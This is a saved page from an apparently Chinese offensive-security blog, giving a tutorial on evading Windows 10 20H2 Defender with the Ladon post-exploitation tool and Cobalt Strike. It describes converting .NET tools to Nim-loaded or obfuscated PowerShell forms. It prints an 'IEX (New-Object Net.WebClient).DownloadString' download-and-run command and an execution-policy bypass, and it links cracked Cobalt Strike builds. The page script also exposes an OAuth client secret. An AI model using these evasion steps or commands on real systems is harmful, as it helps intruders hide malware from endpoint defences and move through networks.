@@ -1,0 +1,402 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Cobalt Strike">
+
+
+<meta name="description" content="WIN10更新至最新版20H2发现，查杀能力比以前强了不少，特别是针对CS加载.NET程序集或NIM加载.NET的查杀，毕竟你要调用的函数微软很了解，它想拦截想杀还是比较容易的。但是不知道大家有...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    〖免杀〗.net程序一键免杀Win10 20H2 Defender |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="〖免杀〗.net程序一键免杀Win10 20H2 Defender">
+            
+            〖免杀〗.net程序一键免杀Win10 20H2 Defender
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Tool/">Tool</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/CS/" rel="tag">Cobalt Strike</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2021/12/09</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1226</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>WIN10更新至最新版20H2发现，查杀能力比以前强了不少，特别是针对CS加载.NET程序集或NIM加载.NET的查杀，毕竟你要调用的函数微软很了解，它想拦截想杀还是比较容易的。但是不知道大家有没听说过一个故事“微软的编程工具的开发工程师，编写程序时，也需要查阅文档”，说明什么？微软系统的API很多，是微软写的没错，但又不是一个人自己写的，就算是一个人自己写的，功能那么多，他也根本记不起，用到自己的东西也要查阅文档，就像我用Ladon有时也要查阅文档，这很正常，因为我写过的工具或功能太多，有些久不用，甚至都会忘记我自己写过什么。所以我想说的是，微软就算做杀软，它也不可能做到全面监控，因为参与开发杀软的人，它不可能对微软系统上百万函数了如指掌，越是大型程序，需要的开发人员越多，很多人都只是负责某一模块对整个系统可能只是一只半解，所以Defender虽然查杀能力某些方面有点加强了，但是很多方面它依旧无法查杀，还没达到自己人写的程序就真比其它杀软牛B的地步，那些专门做杀软的，逆向能力很强，有BIN文件对他们来说就相当于源代码，很多人比微软员工还要了解win系统。举个简单的例子，你在某公司工作，有些员工可能你压根都不认识，更别说和公司所有程序员了解他们所写过的代码，微软的操作系统有多少人来写，defender这部门又只有多少人，他们怎么可能把所有函数都了解，就算24小时不吃饭不做任何事，只研究代码也做不到全面查杀或拦截，至少最近几年还比不过很多主流杀软。任何一个杀软能查杀一个全球大量人使用的工具这是应该也是必须的很常规的考验，杀了不代表这杀软就强了，但是不杀它一定是垃圾。如CS，因为全球大量人使用，任何一个杀软杀它都说明不了什么。好了废话不多说，进入正题。</p>
+<h3 id="GO异或加密免杀">GO异或加密免杀</h3>
+<p>使用GO免杀CS的shellcode，生成的dll上线成功执行CMD命令正常，但执行dumplsass等相关高危功能或加载Ladon时被杀，CS直接下线，甚至加载一个只输出hello world的.net程序集也会被杀，这样会导致我们瞬间失去很多后渗透工具插件带来的便利，这是2021.11.19号的病毒库查杀情况。</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_1.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_2.PNG"></p>
+<p>这种情况怎么解决？CS无法加载Ladon插件，那么我们只能把Ladon传过去了，但测试发现Ladon.exe也被杀，我的发克，竟然还说是木马。</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_3.PNG"></p>
+<h3 id="Nim免杀-net"><a target="_blank" rel="noopener" href="http://xn--Nim-dt1el71h.net">Nim免杀.net</a></h3>
+<p>9月份的时候该方法针对Denfender还是可以的，所以我们可以尝试一下。使用net2nim工具将.net程序转换成bytes，并使用nim加载编译生成新程序,可过一些杀软及旧版Win10 Defender，如图所示</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_4.PNG"></p>
+<h4 id="安装Nim">安装Nim</h4>
+<p><a target="_blank" rel="noopener" href="https://nim-lang.org/">https://nim-lang.org/</a><br>
+下载zip大约20M<br>
+设置环境变量  F:\nim-1.4.8\bin</p>
+<h4 id="安装winim">安装winim</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\k8gege\Desktop&gt;nimble install winim</span><br><span class="line">Downloading https://github.com/khchen/winim using git</span><br><span class="line">  Verifying dependencies <span class="keyword">for</span> winim@3.6.1</span><br><span class="line"> Installing winim@3.6.1</span><br><span class="line">   Success: winim installed successfully.</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="net2nim免杀-net程序">net2nim免杀.net程序</h4>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net2nim Ladon.exe out.exe</span><br></pre></td></tr></tbody></table></figure>
+<p>使用Nim加载.net程序集也可以免杀不少杀软，在此版本之前也可过Defender，但Win10更新至20H2后虽然静态不杀，但一执行会被拦截，提示CLR加载错误，程序也不杀，但无法使用其功能，相当于免杀失败。</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_5.PNG"></p>
+<h3 id="使用LadonGUI免杀-NET程序">使用LadonGUI免杀.NET程序</h3>
+<p>怎么办？我们需要Ladon扫描内网或进行横向移动，但是EXE被杀了，还有办法吗?答案是有的，记得文章开头说过的话吗，Defender在某些方面是杀能力还是比较差的，如powershell、VBS、java、php啊等脚本类语言，不只是它在这方面，其它专做杀软的在这方面也不是很强。去年发布的Ladon 7.5的GUI版本开始就提供有一些PowerShell加密混淆方法，也包含了EXE转PowerShell，PowerShell转EXE功能，也发布过如何将EXE转成PowerShell的教程，以免杀最新版Ladon为例,首先将ladon.exe拖放至exe/dll(.net)文本框中，然后点击右边的"EXE-&gt;PowerShell"按钮，成功会生成Ladon.ps1，如果你只打算把PS1放在win10机器上使用，也可以转Ladon40.exe,毕竟有几个模块只支持.net4.0，当然转换其它.NET程序也一样。</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_6.PNG"></p>
+<p>生成的PS1内容如下，已做好加载，如果是你自己写的程序，只需在第8行开始加入相关参数调用即可。若是Ladon请使用记事本打开ps1文件，复制红线所示@和@里的字符串很长可能有2M<br>
+<img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_7.PNG"></p>
+<p>再打开Ladon9.0.ps1或Ladon9.1.ps1找到里面那个很长的加密字符串，将刚转换的加密字符串粘贴替换，注意长度那里也需要替换，大小不对应也会导致PS1加载失败。<br>
+<img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_8.PNG"></p>
+<p>若发现哪些模块不可使用，可自行参考WIKI，将缺少的模块名称参数加入<br>
+<img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_9.PNG"></p>
+<p>转换完成后，我们再测一下20H2的Defender,免杀成功，可以嗨起来了。无论使用远程还是本地加载Ladon.ps1，Defender都不杀了。</p>
+<h3 id="远程加载免杀">远程加载免杀</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_10.PNG"></p>
+<h3 id="本地加载免杀">本地加载免杀</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -<span class="built_in">exec</span> bypass Import-Module .\Ladon.ps1;Ladon OnlinePC</span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/win10/20h2_11.PNG"></p>
+<p>还有另外一个方法，就是自行免杀LadonGo，开源支持全平台。</p>
+<h3 id="小结">小结</h3>
+<p>大家也可以按照该方法，免杀其它.net写的工具，像Ladon这样一百多个功能的程序都能免杀，相信大部份.net写的程序，应该都能免杀，除非是被Defender重点针对的工具，如mimikat。</p>
+<h3 id="参考">参考</h3>
+<p>Ladon免杀/.NET免杀/Exe2Ps1/Ps12Exe<br>
+<a href="http://k8gege.org/Ladon/Exe2Powershell.html">http://k8gege.org/Ladon/Exe2Powershell.html</a><br>
+Ladon九种PowerShell命令混淆加密免杀方法<br>
+<a href="http://k8gege.org/Ladon/PowershellEncode.html">http://k8gege.org/Ladon/PowershellEncode.html</a></p>
+<h3 id="CS下载">CS下载</h3>
+<p>CS 3.12 3.13 4.3 4.4 K8破解版<br>
+000为原始试用版本(部分未找到，大家可以提供给我更新)<br>
+<a target="_blank" rel="noopener" href="https://github.com/k8gege/Aggressor/releases/tag/cs">https://github.com/k8gege/Aggressor/releases/tag/cs</a></p>
+<h3 id="Ladon下载">Ladon下载</h3>
+<p>LadonGo 3.8: <a target="_blank" rel="noopener" href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a><br>
+PowerLadon: <a target="_blank" rel="noopener" href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br>
+历史版本: <a target="_blank" rel="noopener" href="http://github.com/k8gege/Ladon/releases">http://github.com/k8gege/Ladon/releases</a><br>
+7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>
+9.1版本：K8小密圈</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/cs911.html" class="pre-post btn btn-default" title="〖工具〗Ladon 9.1.1 &amp; CobaltStrike神龙插件发布">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            〖工具〗Ladon 9.1.1 &amp; CobaltStrike神龙插件发布</span>
+    </a>
+    
+    
+    <a href="/p/cs.html" class="next-post btn btn-default" title="〖工具〗Cobalt Strike 3.12 3.13 4.3 4.4 K8破解版">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖工具〗Cobalt Strike 3.12 3.13 4.3 4.4 K8破解版</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#GO%E5%BC%82%E6%88%96%E5%8A%A0%E5%AF%86%E5%85%8D%E6%9D%80"><span class="toc-text">GO异或加密免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nim%E5%85%8D%E6%9D%80-net"><span class="toc-text">Nim免杀.net</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85Nim"><span class="toc-text">安装Nim</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85winim"><span class="toc-text">安装winim</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#net2nim%E5%85%8D%E6%9D%80-net%E7%A8%8B%E5%BA%8F"><span class="toc-text">net2nim免杀.net程序</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8LadonGUI%E5%85%8D%E6%9D%80-NET%E7%A8%8B%E5%BA%8F"><span class="toc-text">使用LadonGUI免杀.NET程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%85%8D%E6%9D%80"><span class="toc-text">远程加载免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8A%A0%E8%BD%BD%E5%85%8D%E6%9D%80"><span class="toc-text">本地加载免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E4%B8%8B%E8%BD%BD"><span class="toc-text">CS下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon%E4%B8%8B%E8%BD%BD"><span class="toc-text">Ladon下载</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
